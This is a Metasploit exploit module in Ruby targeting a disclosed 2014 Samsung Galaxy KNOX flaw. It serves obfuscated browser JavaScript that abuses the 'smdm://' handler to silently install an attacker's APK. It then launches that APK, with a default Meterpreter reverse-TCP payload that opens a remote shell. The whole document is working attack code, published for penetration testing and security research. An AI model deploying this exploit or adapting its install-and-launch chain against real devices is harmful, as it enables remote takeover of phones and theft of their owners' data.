##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'digest/md5'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  # Hash that maps payload ID -> (0|1) if an HTTP request has
  # been made to download a payload of that ID
  attr_reader :served_payloads

  def initialize(info = {})
    super(update_info(info,
      'Name'                => 'Samsung Galaxy KNOX Android Browser RCE',
      'Description'         => %q{
        A vulnerability exists in the KNOX security component of the Samsung Galaxy
        firmware that allows a remote webpage to install an APK with arbitrary
        permissions by abusing the 'smdm://' protocol handler registered by the KNOX
        component.
        The vulnerability has been confirmed in the Samsung Galaxy S4, S5, Note 3,
        and Ace 4.
      },
      'License'             => MSF_LICENSE,
      'Author'              => [
        'Andre Moulu', # discovery, advisory, and exploitation help
        'jduck', # msf module
        'joev'   # msf module
      ],
      'References'          => [
        ['URL', 'http://blog.quarkslab.com/abusing-samsung-knox-to-remotely-install-a-malicious-application-story-of-a-half-patched-vulnerability.html'],
        ['OSVDB', '114590']
      ],
      'Platform'            => 'android',
      'Arch'                => ARCH_DALVIK,
      'DefaultOptions'      => { 'PAYLOAD' => 'android/meterpreter/reverse_tcp' },
      'Targets'             => [ [ 'Automatic', {} ] ],
      'DisclosureDate'      => '2014-11-12',
      'DefaultTarget'       => 0,

      'BrowserRequirements' => {
        :source     => 'script',
        :os_name    => OperatingSystems::Match::ANDROID
      }
    ))

    register_options([
      OptString.new('APK_VERSION', [
        false, "The update version to advertise to the client", "1337"
      ])
    ])

    deregister_options('JsObfuscate')
  end

  def exploit
    @served_payloads = Hash.new(0)
    super
  end

  def apk_bytes
    payload.encoded
  end

  def on_request_uri(cli, req)
    if req.uri =~ /\/([a-zA-Z0-9]+)\.apk\/latest$/
      if req.method.upcase == 'HEAD'
        print_status "Serving metadata..."
        send_response(cli, '', magic_headers)
      else
        print_status "Serving payload '#{$1}'..."
        @served_payloads[$1] = 1
        send_response(cli, apk_bytes, magic_headers)
      end
    elsif req.uri =~ /_poll/
      vprint_status("Polling #{req.qstring['id']}: #{@served_payloads[req.qstring['id']]}")
      send_response(cli, @served_payloads[req.qstring['id']].to_s, 'Content-type' => 'text/plain')
    elsif req.uri =~ /launch$/
      send_response_html(cli, launch_html)
    else
      super
    end
  end

  # The browser appears to be vulnerable, serve the exploit
  def on_request_exploit(cli, req, browser)
    print_status "Serving exploit..."
    send_response_html(cli, generate_html)
  end

  def magic_headers
    { 'Content-Length' => apk_bytes.length,
      'ETag' => Digest::MD5.hexdigest(apk_bytes),
      'x-amz-meta-apk-version' => datastore['APK_VERSION'] }
  end

  def generate_html
    %Q|
      <!doctype html>
      <html><body>
      <script>
      #{exploit_js}
      </script></body></html>
    |
  end

  def exploit_js
    payload_id = rand_word

    js_obfuscate %Q|
      function poll() {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '_poll?id=#{payload_id}&d='+Math.random()*999999999999);
        xhr.onreadystatechange = function(){
          if (xhr.readyState == 4) {
            if (xhr.responseText == '1') {
              setTimeout(killEnrollment, 100);
            } else {
              setTimeout(poll, 1000);
              setTimeout(enroll, 0);
              setTimeout(enroll, 500);
            }
          }
        };
        xhr.onerror = function(){
          setTimeout(poll, 1000);
          setTimeout(enroll, 0);
        };
        xhr.send();
      }
      function enroll() {
        var loc = window.location.href.replace(/[/.]$/g, '');
        top.location = 'smdm://#{rand_word}?update_url='+
          encodeURIComponent(loc)+'/#{payload_id}.apk';
      }
      function killEnrollment() {
        top.location = "intent://#{rand_word}?program="+
          "#{rand_word}/#Intent;scheme=smdm;launchFlags=268468256;end";
        setTimeout(launchApp, 300);
      }
      function launchApp() {
        top.location='intent:view#Intent;SEL;component=com.metasploit.stage/.MainActivity;end';
      }
      enroll();
      setTimeout(poll,600);
    |
  end

  def rand_word
    Rex::Text.rand_text_alphanumeric(3+rand(12))
  end
end
